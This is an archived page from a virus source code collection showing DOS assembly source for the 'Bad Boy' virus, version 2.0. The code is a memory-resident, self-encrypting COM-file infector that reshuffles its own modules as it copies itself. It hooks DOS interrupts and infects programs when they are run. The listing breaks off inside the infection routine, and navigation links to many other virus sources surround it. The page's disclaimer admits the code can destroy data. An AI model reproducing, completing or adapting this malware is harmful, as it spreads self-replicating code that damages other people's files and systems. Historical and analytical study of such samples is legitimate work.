<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: badboy_asm</title>
<meta name="KEYWORDS" content="badboy.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for badboy.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="b-52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/b-52_asm.php">b-52_asm</a><br>
<a href="backfind_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/backfind_pas.php">backfind_pas</a><br>
<a href="backtime_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/backtime_asm.php">backtime_asm</a><br>
<a href="badattit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badattit_asm.php">badattit_asm</a><br>
<a href="badboy20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy20_asm.php">badboy20_asm</a><br>
<a href="badboy2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy2_asm.php">badboy2_asm</a><br>
<a href="badboy___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy___asm.php">badboy___asm</a><br>
<a href="badboy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy__asm.php">badboy__asm</a><br>
<a href="badboy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy_asm.php">badboy_asm</a><br>
<a href="badbrain_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badbrain_asm.php">badbrain_asm</a><br>
<a href="badbrn12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badbrn12_asm.php">badbrn12_asm</a><br>
<a href="bad_cmnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_cmnd_asm.php">bad_cmnd_asm</a><br>
<a href="bad-cmnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad-cmnd_asm.php">bad-cmnd_asm</a><br>
<a href="bad_reli_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_reli_asm.php">bad_reli_asm</a><br>
<a href="badseed1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badseed1_asm.php">badseed1_asm</a><br>
<a href="badseed2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badseed2_asm.php">badseed2_asm</a><br>
<a href="bad_seed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_seed_asm.php">bad_seed_asm</a><br>
<a href="bait1024_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bait1024_asm.php">bait1024_asm</a><br>
<a href="bait512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bait512_asm.php">bait512_asm</a><br>
<a href="ball_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/ball_asm.php">ball_asm</a><br>
<a href="basic0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/basic0_asm.php">basic0_asm</a><br>
<a href="basic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/basic_asm.php">basic_asm</a><br>
<a href="b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/b_asm.php">b_asm</a><br>
<a href="batch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/batch_asm.php">batch_asm</a><br>
<a href="batvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/batvir_asm.php">batvir_asm</a><br>
<a href="bb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bb_asm.php">bb_asm</a><br>
<a href="bbnop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bbnop_asm.php">bbnop_asm</a><br>
<a href="bbrains_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bbrains_asm.php">bbrains_asm</a><br>
<a href="beast-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beast-b_asm.php">beast-b_asm</a><br>
<a href="beavis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beavis_asm.php">beavis_asm</a><br>
<a href="becky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/becky_asm.php">becky_asm</a><br>
<a href="bedtime_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bedtime_asm.php">bedtime_asm</a><br>
<a href="beep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beep_asm.php">beep_asm</a><br>
<a href="bengal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bengal_asm.php">bengal_asm</a><br>
<a href="berylium_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/berylium_asm.php">berylium_asm</a><br>
<a href="bill_ted_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bill_ted_c.php">bill_ted_c</a><br>
<a href="bin_acid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bin_acid_asm.php">bin_acid_asm</a><br>
<a href="bin-obs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bin-obs_asm.php">bin-obs_asm</a><br>
<a href="biohazrd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biohazrd_asm.php">biohazrd_asm</a><br>
<a href="biosdata_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biosdata_asm.php">biosdata_asm</a><br>
<a href="bios_men_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bios_men_asm.php">bios_men_asm</a><br>
<a href="biowar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biowar_asm.php">biowar_asm</a><br>
<a href="bitaddct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bitaddct_asm.php">bitaddct_asm</a><br>
<a href="bizarre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bizarre_asm.php">bizarre_asm</a><br>
<a href="bjec-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-3_asm.php">bjec-3_asm</a><br>
<a href="bjec-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-4_asm.php">bjec-4_asm</a><br>
<a href="bjec-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-5_asm.php">bjec-5_asm</a><br>
<a href="bjec-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-6_asm.php">bjec-6_asm</a><br>
<a href="bjec-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-7_asm.php">bjec-7_asm</a><br>
<a href="bjec-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-8_asm.php">bjec-8_asm</a><br>
<a href="bjec-9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-9_asm.php">bjec-9_asm</a><br>
<a href="blacjec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/blacjec_asm.php">blacjec_asm</a><br>
<a href="bljec_3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_3a_asm.php">bljec_3a_asm</a><br>
<a href="bljec-3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-3a_asm.php">bljec-3a_asm</a><br>
<a href="bljec_4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_4a_asm.php">bljec_4a_asm</a><br>
<a href="bljec-4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-4a_asm.php">bljec-4a_asm</a><br>
<a href="bljec_5a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_5a_asm.php">bljec_5a_asm</a><br>
<a href="bljec-5a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-5a_asm.php">bljec-5a_asm</a><br>
<a href="bljec5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec5_asm.php">bljec5_asm</a><br>
<a href="bljec_6a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_6a_asm.php">bljec_6a_asm</a><br>
<a href="bljec-6a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-6a_asm.php">bljec-6a_asm</a><br>
<a href="bljec_7a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_7a_asm.php">bljec_7a_asm</a><br>
<a href="bljec-7a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-7a_asm.php">bljec-7a_asm</a><br>
<a href="bljec_8a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_8a_asm.php">bljec_8a_asm</a><br>
<a href="bljec-8a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-8a_asm.php">bljec-8a_asm</a><br>
<a href="bljec_9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_9a_asm.php">bljec_9a_asm</a><br>
<a href="bljec-9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-9a_asm.php">bljec-9a_asm</a><br>
<a href="bljec9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec9a_asm.php">bljec9a_asm</a><br>
<a href="bljec9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec9_asm.php">bljec9_asm</a><br>
<a href="blknight_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/blknight_asm.php">blknight_asm</a><br>
<a href="bloody_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bloody_asm.php">bloody_asm</a><br>
<a href="bob_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bob_asm.php">bob_asm</a><br>
<a href="bobross_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bobross_asm.php">bobross_asm</a><br>
<a href="bobvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bobvirus_asm.php">bobvirus_asm</a><br>
<a href="bomber_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bomber_c.php">bomber_c</a><br>
<a href="bontchev_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bontchev_pas.php">bontchev_pas</a><br>
<a href="boot1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot1_asm.php">boot1_asm</a><br>
<a href="boot2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot2_asm.php">boot2_asm</a><br>
<a href="boot410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot410_asm.php">boot410_asm</a><br>
<a href="boot___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot___asm.php">boot___asm</a><br>
<a href="boot__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot__asm.php">boot__asm</a><br>
<a href="boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot_asm.php">boot_asm</a><br>
<a href="bootvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bootvir_asm.php">bootvir_asm</a><br>
<a href="botdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/botdos_asm.php">botdos_asm</a><br>
<a href="bouncbal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bouncbal_asm.php">bouncbal_asm</a><br>
<a href="brain0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain0_asm.php">brain0_asm</a><br>
<a href="brain2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain2_asm.php">brain2_asm</a><br>
<a href="brain3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain3_asm.php">brain3_asm</a><br>
<a href="brain___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain___asm.php">brain___asm</a><br>
<a href="brain_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_asm.php">brain_asm</a><br>
<a href="brainext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brainext_asm.php">brainext_asm</a><br>
<a href="brain_v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_v1_asm.php">brain_v1_asm</a><br>
<a href="brain-v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain-v1_asm.php">brain-v1_asm</a><br>
<a href="brain_v3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_v3_asm.php">brain_v3_asm</a><br>
<a href="brain-v3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain-v3_asm.php">brain-v3_asm</a><br>
<a href="breeze___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze___asm.php">breeze___asm</a><br>
<a href="breeze__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze__asm.php">breeze__asm</a><br>
<a href="breeze_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze_asm.php">breeze_asm</a><br>
<a href="brother1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother1_asm.php">brother1_asm</a><br>
<a href="brother2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother2_asm.php">brother2_asm</a><br>
<a href="brother3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother3_asm.php">brother3_asm</a><br>
<a href="brother4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother4_asm.php">brother4_asm</a><br>
<a href="brother5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother5_asm.php">brother5_asm</a><br>
<a href="brother__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother__asm.php">brother__asm</a><br>
<a href="brother_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother_asm.php">brother_asm</a><br>
<a href="brthr2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brthr2_asm.php">brthr2_asm</a><br>
<a href="brthr3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brthr3_asm.php">brthr3_asm</a><br>
<a href="bsv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bsv__asm.php">bsv__asm</a><br>
<a href="bsv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bsv_asm.php">bsv_asm</a><br>
<a href="bubbles1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles1_asm.php">bubbles1_asm</a><br>
<a href="bubbles2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles2_asm.php">bubbles2_asm</a><br>
<a href="bubbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles_asm.php">bubbles_asm</a><br>
<a href="bulldoze_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bulldoze_asm.php">bulldoze_asm</a><br>
<a href="burg_541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_541_asm.php">burg_541_asm</a><br>
<a href="burg-541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg-541_asm.php">burg-541_asm</a><br>
<a href="burg541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg541__asm.php">burg541__asm</a><br>
<a href="burg541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg541_asm.php">burg541_asm</a><br>
<a href="burg_cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_cia_asm.php">burg_cia_asm</a><br>
<a href="burg-cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg-cia_asm.php">burg-cia_asm</a><br>
<a href="burger2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger2_asm.php">burger2_asm</a><br>
<a href="burger__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger__asm.php">burger__asm</a><br>
<a href="burger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger_asm.php">burger_asm</a><br>
<a href="burger_c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger_c_asm.php">burger_c_asm</a><br>
<a href="burgr____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burgr____asm.php">burgr____asm</a><br>
<a href="burg_vi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vi__asm.php">burg_vi__asm</a><br>
<a href="burg_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vir_asm.php">burg_vir_asm</a><br>
<a href="burg_vir_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vir_bas.php">burg_vir_bas</a><br>
<a href="burma2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burma2_asm.php">burma2_asm</a><br>
<a href="burma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burma_asm.php">burma_asm</a><br>
<a href="bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bush_asm.php">bush_asm</a><br>
<a href="busted__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/busted__asm.php">busted__asm</a><br>
<a href="busted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/busted_asm.php">busted_asm</a><br>
<a href="butthole_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/butthole_asm.php">butthole_asm</a><br>
<a href="buttrfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/buttrfly_asm.php">buttrfly_asm</a><br>
<a href="buttsurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/buttsurf_asm.php">buttsurf_asm</a><br>
<a href="bv3_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bv3_bas.php">bv3_bas</a><br>
<a href="bw1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bw1_asm.php">bw1_asm</a><br>
<a href="bwme_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bwme_asm.php">bwme_asm</a><br>
<a href="bypass_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bypass_asm.php">bypass_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

code          segment
              assume cs:code,ds:code
              .radix 16
              org  100
start:
              push word ptr cs:[table+2]
              push cs
              pop  ds
              jmp  word ptr cs:[table]    ;go to module 1

curofs        dw   ?
files         db   0                   ;number of infected files from this copy
fsize         dw   2                   ;size of infected file
ftime         dw     ?
fdate         dw     ?
stdint21      dd     ?
oldint13      dd     ?
oldint21      dd     ?
oldint24      dd     ?

;------------- TABLE WITH MODULE PARAMETERS --------------------
table:
              dw   offset false_mod_1 ;00
              dw   offset mod_2       ;02
              dw   offset mod_3       ;04
              dw   offset mod_4       ;06              ;offset modules
              dw   offset mod_5       ;08
              dw   offset mod_6       ;0a
              dw   offset mod_7       ;0c
              dw   offset mod_8       ;0e

              dw   offset mod_2 - offset mod_1;10
              dw   offset mod_3 - offset mod_2;12
              dw   offset mod_4 - offset mod_3;14
              dw   offset mod_5 - offset mod_4;16
              dw   offset mod_6 - offset mod_5;18       ;size modules
              dw   offset mod_7 - offset mod_6;1a
              dw   offset mod_8 - offset mod_7;1c
              dw   offset myend - offset mod_8;1e


;------------- MODULE - 1 - CODER/DECODER ----------------------
mod_1:
              mov  bx,offset table+2   ;first module to working (module 2)
              mov  cx,6                ;number of modules to working
mod_1_lp1:
              cmp  bx,offset table+0a
              jne  mod_1_cont
              add  bx,2
mod_1_cont:
              push bx
              push cx
              mov  ax,[bx]             ;ax - offset module
              mov  cx,[bx+10]          ;cx - size of module
              mov  bx,ax
mod_1_lp2:
              xor  byte ptr [bx],al
              inc  bx
              loop mod_1_lp2
              pop  cx
              pop  bx
              add  bx,2
              loop mod_1_lp1
              ret

;------------- MODULE - 2 - MUTATION TO MEMORY -----------------
mod_2:
                     ;instalation check

              mov    es,cs:[2]                             ;memory size
              mov    di,100
              mov    si,100
              mov    cx,0bh
              repe   cmpsb
              jne    mod_2_install                         ;jump if not install
              jmp    word ptr cs:[table+06]  ;if install, jump to module 4

mod_2_install:
                     ;instalation

              mov    ax,cs
              dec    ax
              mov    ds,ax

              cmp    byte ptr ds:[0],'Z'
              je     mod_2_cont

              jmp    word ptr cs:[table+6]          ;if no last MCB - go to mod4

mod_2_cont:
              sub    word ptr ds:[3],0c0
              mov    ax,es
              sub    ax,0c0
              mov    es,ax
              mov    word ptr ds:[12],ax       ;decrement memory size with 2K
              push   cs
              pop    ds

mod_2_mut:
              mov  byte ptr cs:files,0

              mov  di,100
              mov  cx,offset mod_1-100
              mov  si,100
              rep  movsb     ;write table to new memory

              mov  bx,word ptr cs:[table]
              add  bx,offset mod_1_lp2-offset mod_1+1
              xor  byte ptr [bx],18                        ;change code method

              mov  cx,8
              mov  word ptr curofs,offset mod_1
mod_2_lp1:
              push cx
              call mod_2_rnd ;generate random module addres
              push bx        ;addres in table returned from mod_2_rnd
              mov  ax,[bx]   ;offset module
              push ax
              add  bx,10
              mov  cx,[bx]   ;length of module
              pop  si
              pop  bx
              xchg di,curofs
              mov  word ptr es:[bx],di ;change module offset in table
              rep  movsb               ;copy module to new memory
              xchg di,curofs           ;change current offset in new memory
              mov  ax,8000
              or   word ptr [bx],ax    ;mark module - used
              pop  cx
              loop mod_2_lp1
              mov  cl,8
              not  ax
              mov  bx,offset table
mod_2_lp2:
              and  word ptr [bx],ax    ;unmark all modules
              add  bx,2
              loop mod_2_lp2

              jmp  word ptr cs:[table+4]  ;go to module 3

mod_2_rnd:
              push cx
              push es
              xor  cx,cx
              mov  es,cx
mod_2_lp3:
              mov  bx,es:[46c]
              db 81,0e3,07,00  ;and bx,7
              shl  bx,1
              add  bx,offset table
              test [bx],8000
              jnz  mod_2_lp3
              pop  es
              pop  cx
              ret

;------------- MODULE - 3 - SET INTERRUPT VECTORS ---------------
mod_3:
              xor    ax,ax
              mov    ds,ax

              mov    ax,ds:[4*21]
              mov    word ptr es:[oldint21],ax
              mov    ax,ds:[4*21+2]
              mov    word ptr es:[oldint21+2],ax

              mov    ah,30
              int    21
              cmp    ax,1e03
              jne    mod_3_getvec

              mov    word ptr es:[stdint21],1460
              mov    ax,1203
              push   ds
              int    2f
              mov    word ptr es:[stdint21+2],ds
              pop    ds
              jmp    mod_3_setvec

mod_3_getvec:
              mov    ax,ds:[4*21]
              mov    word ptr es:[stdint21],ax
              mov    ax,ds:[4*21+2]
              mov    word ptr es:[stdint21+2],ax

mod_3_setvec:
              cli
              mov    ax,word ptr es:[table+0c]
              mov    ds:[4*21],ax
              mov    ax,es
              mov    ds:[4*21+2],ax
              sti

              mov    cx,es
              mov    ah,13                       ;
              int    2f                          ;
              push   es                          ;
              mov    es,cx                       ;
              mov    word ptr es:[oldint13],dx   ; get standart int13 addres
              mov    word ptr es:[oldint13+2],ds ;
              pop    es                          ;
              int    2f                          ;

              jmp    word ptr cs:[table+06]                   ;go to module 4

;------------- MODULE - 4 - RESTORE OLD PROGRAM CODE & START ----
mod_4:
              push   cs
              push   cs
              pop    ds
              pop    es
              mov    si,word ptr cs:[table+06]
              add    si,offset mod_4_cont - offset mod_4
              mov    di,cs:fsize
              add    di,offset myend+1
              push   di
              mov    cx,offset mod_5 - offset mod_4_cont
              cld
              rep    movsb
              ret
mod_4_cont:
              mov    si,cs:fsize
              add    si,100

              cmp    si,offset myend+1
              jnc    mod_4_cnt
              mov    si,offset myend+1
mod_4_cnt:
              mov    di,100
              mov    cx,offset myend-100
              rep    movsb
              mov    ax,100   ;
              push   ax       ; jmp 100
              ret             ;

;------------- MODULE - 5 - SPECIAL PROGRAM ---------------------
mod_5:
              xor    di,di
              mov    ds,di
              cli
              mov    di,word ptr cs:[oldint21]
              mov    ds:[4*21],di
              mov    di,word ptr cs:[oldint21+2]
              mov    ds:[4*21+2],di
              sti

              ret

              db     'Make me better!'
;------------- MODULE - 6 - INT 24 HEADER -----------------------
mod_6:
              mov    al,3
              iret
              db     'The Bad Boy virus, Version 2.0, Copyright (C) 1991.',0

;------------- MODULE - 7 - INT 21 HEADER -----------------------
mod_7:
              push   bx
              push   si
              push   di
              push   es
              push   ax

              cmp    ax,4b00
              je     mod_7_begin
              jmp    mod_7_exit
mod_7_begin:
              push   ds
              push   cs                                ;
              pop    es                                ;
              xor    ax,ax                             ;
              mov    ds,ax                             ;
              mov    si,4*24                           ;
              mov    di,offset oldint24                ;
              movsw                                    ;   change int24 vector
              movsw                                    ;
              mov    ax,word ptr cs:[table+0a]         ;
              cli                                      ;
              mov    ds:[4*24],ax                      ;
              mov    ax,cs                             ;
              mov    ds:[4*24+2],ax                    ;
              sti
              pop    ds

              mov    ax,3d00                           ;
              pushf                                    ;
              call   cs:oldint21                       ;
              jc     mod_7_ex                          ; open,infect,close file
              mov    bx,ax                             ;
mod_7_infect:                                          ;
              call   word ptr cs:[table+0e]            ;
              pushf
              mov    ah,3e                             ;
              pushf                                    ;
              call   cs:oldint21                       ;
              popf
              jc     mod_7_ex

              push   ds                          ;
              cli                                ;
              xor    ax,ax                       ;
              mov    ds,ax                       ;
              mov    ax,word ptr cs:[oldint13]   ;
              xchg   ax,word ptr ds:[4*13]       ;
              mov    word ptr cs:[oldint13],ax   ; exchange int13 vectors
              mov    ax,word ptr cs:[oldint13+2] ;
              xchg   ax,word ptr ds:[4*13+2]     ;
              mov    word ptr cs:[oldint13+2],ax ;
              sti                                ;
              pop    ds                          ;
mod_7_ex:
              push   ds                                ;
              xor    ax,ax                             ;
              mov    ds,ax                             ;
              mov    ax,word ptr cs:oldint24           ;
              mov    ds:[4*24],ax                      ;
              mov    ax,word ptr cs:oldint24+2         ; restore int24 vector
              mov    ds:[4*24+2],ax                    ;
              pop    ds                                ;

mod_7_exit:
              pop    ax
              pop    es
              pop    di
              pop    si
              pop    bx

              jmp    cs:oldint21

;------------- MODULE - 8 - INFECTING (bx - file handle) --------
mod_8:
              push   cx
              push   dx
              push   ds
              push   es
              push   di
              push   bp

              push   bx
              mov    ax,1220
              int    2f
              mov    bl,es:[di]
              xor    bh,bh
              mov    ax,1216
